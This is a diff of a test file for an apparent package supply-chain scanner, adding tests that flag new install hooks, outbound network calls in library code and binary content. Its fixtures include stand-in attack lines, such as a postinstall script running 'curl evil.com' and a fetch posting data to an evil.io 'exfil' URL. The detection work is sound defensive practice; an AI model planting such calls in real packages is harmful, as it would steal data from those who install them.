@@ -22,6 +22,7 @@ import activities.ecosystems as ecosystems_module
 import activities.package_diff as pkg_diff_module
 from activities.ecosystems import safe_zip_extractall as _safe_zip_extractall
 from activities.ecosystems import validate_archive_url as _validate_archive_url
+from activities.models import PackageSignals, DiffSignals, ReleaseAgeSignals
 from activities.package_diff import (
     _build_diff,
     _extract_and_diff,
@@ -193,7 +194,7 @@ def _write_files(base: Path, files: dict[str, str | bytes]) -> dict[str, Path]:
 def test_build_diff_no_changes(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
     new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 1\n"})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert result == "[no significant changes detected]"
     assert not added
     assert not changed
@@ -202,7 +203,7 @@ def test_build_diff_no_changes(tmp_path):
 def test_build_diff_other_changed_file(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
     new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 2\n"})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert "CHANGED (other)" in result
     assert "pkg/utils.py" in result
     assert not added
@@ -215,7 +216,7 @@ def test_build_diff_dangerous_new_binary(tmp_path):
         "pkg/__init__.py": "x=1\n",
         "pkg/_speedups.so": b"\x7fELF",
     })
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert "DANGEROUS BINARY" in result
     assert "_speedups.so" in result
     assert "NEW:" in result
@@ -224,7 +225,7 @@ def test_build_diff_dangerous_new_binary(tmp_path):
 def test_build_diff_dangerous_changed_binary(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/_ext.so": b"\x7fELF old"})
     new = _write_files(tmp_path / "new", {"pkg/_ext.so": b"\x7fELF new"})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert "DANGEROUS BINARY" in result
     assert "MODIFIED:" in result
     assert "_ext.so" in result
@@ -234,7 +235,7 @@ def test_build_diff_dangerous_changed_binary_unchanged_hash_not_reported(tmp_pat
     content = b"\x7fELF identical"
     old = _write_files(tmp_path / "old", {"pkg/_ext.so": content})
     new = _write_files(tmp_path / "new", {"pkg/_ext.so": content})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert result == "[no significant changes detected]"
 
 
@@ -244,7 +245,7 @@ def test_build_diff_truncated_when_large(tmp_path):
     large_new = "\n".join(f"line_new_{i} = {i}" for i in range(15_000))
     old = _write_files(tmp_path / "old", {"__init__.py": large_old})
     new = _write_files(tmp_path / "new", {"__init__.py": large_new})
-    result, _, _, _ = _build_diff(old, new)
+    result, *_ = _build_diff(old, new)
     assert "truncated" in result
     assert "100KB" in result
 
@@ -259,7 +260,7 @@ def test_build_diff_new_setup_py_sets_added_flag(tmp_path):
         "pkg/utils.py": "x = 1\n",
         "setup.py": "from setuptools import setup; setup()\n",
     })
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert added is True
     assert changed is False
 
@@ -267,7 +268,7 @@ def test_build_diff_new_setup_py_sets_added_flag(tmp_path):
 def test_build_diff_changed_setup_py_sets_changed_flag(tmp_path):
     old = _write_files(tmp_path / "old", {"setup.py": "from setuptools import setup; setup()\n"})
     new = _write_files(tmp_path / "new", {"setup.py": "from setuptools import setup; setup(name='evil')\n"})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert added is False
     assert changed is True
 
@@ -278,7 +279,7 @@ def test_build_diff_new_postinstall_js_sets_added_flag(tmp_path):
         "index.js": "module.exports = {}\n",
         "postinstall.js": "require('child_process').exec('curl evil.com')\n",
     })
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert added is True
 
 
@@ -288,7 +289,7 @@ def test_build_diff_package_json_new_postinstall_script_sets_added_flag(tmp_path
     new_pkg = _json.dumps({"name": "mypkg", "version": "1.0.1", "scripts": {"test": "jest", "postinstall": "node setup.js"}})
     old = _write_files(tmp_path / "old", {"package.json": old_pkg})
     new = _write_files(tmp_path / "new", {"package.json": new_pkg})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     assert added is True
     assert changed is False
 
@@ -299,7 +300,7 @@ def test_build_diff_package_json_changed_existing_postinstall_does_not_set_added
     new_pkg = _json.dumps({"scripts": {"postinstall": "node v2.js"}})
     old = _write_files(tmp_path / "old", {"package.json": old_pkg})
     new = _write_files(tmp_path / "new", {"package.json": new_pkg})
-    result, added, changed, _dep_count = _build_diff(old, new)
+    result, added, changed, _dep_count, *_ = _build_diff(old, new)
     # Key already existed — not "added", just changed content (caught by LLM diff)
     assert added is False
 
@@ -351,7 +352,7 @@ def test_get_file_map_filters_noise(tmp_path):
 
 def test_extract_and_diff_bad_archive_returns_error_string():
     from activities.ecosystems.pip import PipProvider
-    result, added, changed, _dep_count = _extract_and_diff(b"not a real archive", "bad.tar.gz", b"also bad", "bad2.tar.gz", PipProvider())
+    result, added, changed, _dep_count, *_ = _extract_and_diff(b"not a real archive", "bad.tar.gz", b"also bad", "bad2.tar.gz", PipProvider())
     assert result.startswith("[extraction error:")
     assert not added
     assert not changed
@@ -359,7 +360,7 @@ def test_extract_and_diff_bad_archive_returns_error_string():
 
 def test_extract_and_diff_unsupported_format_returns_error_string():
     from activities.ecosystems.pip import PipProvider
-    result, added, changed, _dep_count = _extract_and_diff(b"data", "pkg.rpm", b"data", "pkg2.rpm", PipProvider())
+    result, added, changed, _dep_count, *_ = _extract_and_diff(b"data", "pkg.rpm", b"data", "pkg2.rpm", PipProvider())
     assert result.startswith("[extraction error:")
 
 
@@ -804,7 +805,7 @@ def test_build_diff_counts_new_npm_deps(tmp_path):
     new_pkg = _json.dumps({"dependencies": {"express": "^4.0.0", "lodash": "^4.17.0", "axios": "^1.0.0"}, "devDependencies": {"jest": "^29.0.0"}})
     old = _write_files(tmp_path / "old", {"package.json": old_pkg})
     new = _write_files(tmp_path / "new", {"package.json": new_pkg})
-    _, _, _, dep_count = _build_diff(old, new)
+    _, _, _, dep_count, *_ = _build_diff(old, new)
     assert dep_count == 3  # lodash, axios, jest are new
 
 
@@ -813,14 +814,14 @@ def test_build_diff_counts_new_pip_deps(tmp_path):
     new_reqs = "requests>=2.0\nflask>=2.0\nboto3>=1.0\nhttpx>=0.24\nsqlalchemy>=2.0\n"
     old = _write_files(tmp_path / "old", {"requirements.txt": old_reqs})
     new = _write_files(tmp_path / "new", {"requirements.txt": new_reqs})
-    _, _, _, dep_count = _build_diff(old, new)
+    _, _, _, dep_count, *_ = _build_diff(old, new)
     assert dep_count == 3  # boto3, httpx, sqlalchemy are new
 
 
 def test_build_diff_dep_count_zero_when_no_manifest_changes(tmp_path):
     old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
     new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 2\n"})
-    _, _, _, dep_count = _build_diff(old, new)
+    _, _, _, dep_count, *_ = _build_diff(old, new)
     assert dep_count == 0
 
 
@@ -829,29 +830,20 @@ def test_build_diff_dep_count_zero_when_deps_removed(tmp_path):
     new_pkg = _json.dumps({"dependencies": {"express": "^4.0.0"}})
     old = _write_files(tmp_path / "old", {"package.json": old_pkg})
     new = _write_files(tmp_path / "new", {"package.json": new_pkg})
-    _, _, _, dep_count = _build_diff(old, new)
+    _, _, _, dep_count, *_ = _build_diff(old, new)
     assert dep_count == 0  # lodash removed, not added
 
 
 def test_classifier_flags_large_dep_increase():
     from activities.classifier import _rule_based
-    from activities.models import PackageSignals
 
     signals = PackageSignals(
         ecosystem="npm",
         package_name="mypkg",
         old_version="1.0.0",
         new_version="1.1.0",
-        release_age_hours=500.0,
-        is_major_bump=False,
-        socket_score=None,
-        socket_alerts=[],
-        osv_vulnerabilities=[],
-        diff_summary="package.json changed",
-        diff_size_bytes=200,
-        maintainer_changed=False,
-        weekly_downloads=100_000,
-        new_dependency_count=5,
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(diff_summary="package.json changed", diff_size_bytes=200, new_dependency_count=5),
     )
     verdict = _rule_based(signals)
     assert verdict.classification == "yellow"
@@ -860,23 +852,14 @@ def test_classifier_flags_large_dep_increase():
 
 def test_classifier_no_flag_for_small_dep_increase():
     from activities.classifier import _rule_based
-    from activities.models import PackageSignals
 
     signals = PackageSignals(
         ecosystem="npm",
         package_name="mypkg",
         old_version="1.0.0",
         new_version="1.1.0",
-        release_age_hours=500.0,
-        is_major_bump=False,
-        socket_score=None,
-        socket_alerts=[],
-        osv_vulnerabilities=[],
-        diff_summary="[no significant changes]",
-        diff_size_bytes=0,
-        maintainer_changed=False,
-        weekly_downloads=100_000,
-        new_dependency_count=2,
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(diff_summary="[no significant changes]", diff_size_bytes=0, new_dependency_count=2),
     )
     verdict = _rule_based(signals)
     assert verdict.classification == "green"
@@ -888,3 +871,213 @@ def test_compute_returns_new_dependency_count_field():
     from activities.models import DiffSignals
     sig = DiffSignals(diff_summary="ok", diff_size_bytes=10, new_dependency_count=4)
     assert sig.new_dependency_count == 4
+
+
+# ---------------------------------------------------------------------------
+# network_calls_in_lib — newly-added outbound HTTP calls in library code
+# ---------------------------------------------------------------------------
+
+from activities.package_diff import (
+    _added_lines_have_net_calls,
+    _diff_added_lines,
+    _has_binary_content,
+)
+
+
+def test_net_calls_detected_in_new_ruby_file(tmp_path):
+    """A brand-new .rb file containing Net::HTTP sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"lib/helper.rb": "def greet; 'hello'; end\n"})
+    new = _write_files(tmp_path / "new", {
+        "lib/helper.rb": "def greet; 'hello'; end\n",
+        "lib/reporter.rb": "require 'net/http'\nNet::HTTP.post(URI('https://evil.io'), data)\n",
+    })
+    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_in_changed_python_file(tmp_path):
+    """A .py file gaining a requests.post call sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"mylib/utils.py": "def compute(x):\n    return x * 2\n"})
+    new = _write_files(tmp_path / "new", {
+        "mylib/utils.py": (
+            "import requests\n"
+            "def compute(x):\n"
+            "    requests.post('https://telemetry.example.com', json={'v': x})\n"
+            "    return x * 2\n"
+        ),
+    })
+    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_not_flagged_in_install_hook(tmp_path):
+    """Net::HTTP in extconf.rb (an install hook) is already a separate signal — not double-counted."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(tmp_path / "new", {
+        "ext/myext/extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n",
+    })
+    _, install_added, _, _, net_calls, _ = _build_diff(old, new)
+    assert install_added is True
+    assert net_calls is False  # not double-counted
+
+
+def test_net_calls_not_flagged_for_unchanged_code(tmp_path):
+    """Pre-existing networking code that doesn't change does not set the flag."""
+    code = "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n"
+    old = _write_files(tmp_path / "old", {"lib/client.rb": code})
+    new = _write_files(tmp_path / "new", {"lib/client.rb": code})
+    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    assert net_calls is False
+
+
+def test_net_calls_not_flagged_for_comment_lines(tmp_path):
+    """Comment lines mentioning Net::HTTP should not trigger the flag."""
+    old = _write_files(tmp_path / "old", {"lib/util.rb": "x = 1\n"})
+    new = _write_files(tmp_path / "new", {
+        "lib/util.rb": "x = 1\n# Net::HTTP example: Net::HTTP.get(...)\n",
+    })
+    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    assert net_calls is False
+
+
+def test_added_lines_have_net_calls_ruby():
+    assert _added_lines_have_net_calls(["Net::HTTP.post(uri, data)"], ".rb") is True
+    assert _added_lines_have_net_calls(["Faraday.new(url: 'https://example.com')"], ".rb") is True
+    assert _added_lines_have_net_calls(["def calculate(x); x * 2; end"], ".rb") is False
+
+
+def test_added_lines_have_net_calls_python():
+    assert _added_lines_have_net_calls(["requests.post('https://evil.io', json=data)"], ".py") is True
+    assert _added_lines_have_net_calls(["httpx.get('https://api.example.com')"], ".py") is True
+    assert _added_lines_have_net_calls(["result = compute(x)"], ".py") is False
+
+
+def test_added_lines_have_net_calls_javascript():
+    assert _added_lines_have_net_calls(["fetch('https://evil.io/exfil', {method: 'POST', body: data})"], ".js") is True
+    assert _added_lines_have_net_calls(["axios.post('https://example.com', payload)"], ".js") is True
+    assert _added_lines_have_net_calls(["const result = compute(x);"], ".js") is False
+
+
+def test_added_lines_have_net_calls_php():
+    assert _added_lines_have_net_calls(["$ch = curl_init('https://evil.io');"], ".php") is True
+    assert _added_lines_have_net_calls(["$result = calculate($x);"], ".php") is False
+
+
+def test_added_lines_have_net_calls_unknown_ext():
+    # Unknown extension — no patterns to match, should not fire
+    assert _added_lines_have_net_calls(["Net::HTTP.get(uri)"], ".xyz") is False
+
+
+def test_diff_added_lines_extracts_only_additions():
+    old = "line1\nline2\n"
+    new = "line1\nline2\nnew_line\n"
+    added = _diff_added_lines(old, new)
+    assert added == ["new_line"]
+
+
+def test_classifier_flags_network_calls_in_lib():
+    from activities.classifier import _rule_based
+    signals = PackageSignals(
+        ecosystem="rubygems",
+        package_name="my-gem",
+        old_version="1.0.0",
+        new_version="1.1.0",
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(
+            diff_summary="lib/reporter.rb changed",
+            diff_size_bytes=200,
+            network_calls_in_lib=True,
+        ),
+    )
+    verdict = _rule_based(signals)
+    assert verdict.classification == "yellow"
+    assert any("network calls" in f for f in verdict.flags)
+
+
+# ---------------------------------------------------------------------------
+# binary_data_added — binary content in non-binary-extension files
+# ---------------------------------------------------------------------------
+
+def test_binary_data_flagged_for_txt_with_null_bytes(tmp_path):
+    """A new .txt file containing null bytes (binary) sets binary_data_added."""
+    old = _write_files(tmp_path / "old", {})
+    new_dir = tmp_path / "new"
+    new_dir.mkdir()
+    (new_dir / "lib").mkdir()
+    (new_dir / "lib" / "result.txt").write_bytes(b"scraped data\x00\x01\x02binary content here")
+    new = _get_file_map(str(new_dir))
+    old_map: dict = {}
+    _, _, _, _, _, binary_added = _build_diff(old_map, new)
+    assert binary_added is True
+
+
+def test_binary_data_flagged_for_rb_with_binary_content(tmp_path):
+    """A new .rb file with >10% non-text bytes sets binary_data_added."""
+    old = _write_files(tmp_path / "old", {})
+    new_dir = tmp_path / "new"
+    new_dir.mkdir()
+    # Craft binary content: mostly binary bytes
+    binary_payload = bytes(range(256)) * 40  # all byte values repeated
+    new_dir_lib = new_dir / "lib"
+    new_dir_lib.mkdir()
+    (new_dir_lib / "payload.rb").write_bytes(binary_payload)
+    new = _get_file_map(str(new_dir))
+    _, _, _, _, _, binary_added = _build_diff({}, new)
+    assert binary_added is True
+
+
+def test_binary_data_not_flagged_for_known_binary_extensions(tmp_path):
+    """PNG/JPG files are expected to be binary — not flagged."""
+    old = _write_files(tmp_path / "old", {})
+    new_dir = tmp_path / "new"
+    new_dir.mkdir()
+    (new_dir / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00binary data here" + bytes(range(100)))
+    new = _get_file_map(str(new_dir))
+    _, _, _, _, _, binary_added = _build_diff({}, new)
+    assert binary_added is False
+
+
+def test_binary_data_not_flagged_for_clean_text_files(tmp_path):
+    """A normal text .txt file does not set binary_data_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(tmp_path / "new", {"lib/result.txt": "This is normal text content.\n"})
+    _, _, _, _, _, binary_added = _build_diff({}, new)
+    assert binary_added is False
+
+
+def test_has_binary_content_null_bytes(tmp_path):
+    f = tmp_path / "file.txt"
+    f.write_bytes(b"hello\x00world")
+    assert _has_binary_content(f) is True
+
+
+def test_has_binary_content_clean_text(tmp_path):
+    f = tmp_path / "file.txt"
+    f.write_text("This is normal ASCII text content.\n")
+    assert _has_binary_content(f) is False
+
+
+def test_has_binary_content_high_non_ascii(tmp_path):
+    f = tmp_path / "file.rb"
+    # 50% non-printable bytes — clearly binary
+    f.write_bytes(bytes([0x01, 0x02, 0x03, 0x04] * 100) + b"normal" * 10)
+    assert _has_binary_content(f) is True
+
+
+def test_classifier_flags_binary_data_added():
+    from activities.classifier import _rule_based
+    signals = PackageSignals(
+        ecosystem="rubygems",
+        package_name="my-gem",
+        old_version="1.0.0",
+        new_version="1.1.0",
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(
+            diff_summary="lib/result.txt added",
+            diff_size_bytes=200,
+            binary_data_added=True,
+        ),
+    )
+    verdict = _rule_based(signals)
+    assert verdict.classification == "yellow"
+    assert any("binary" in f for f in verdict.flags)
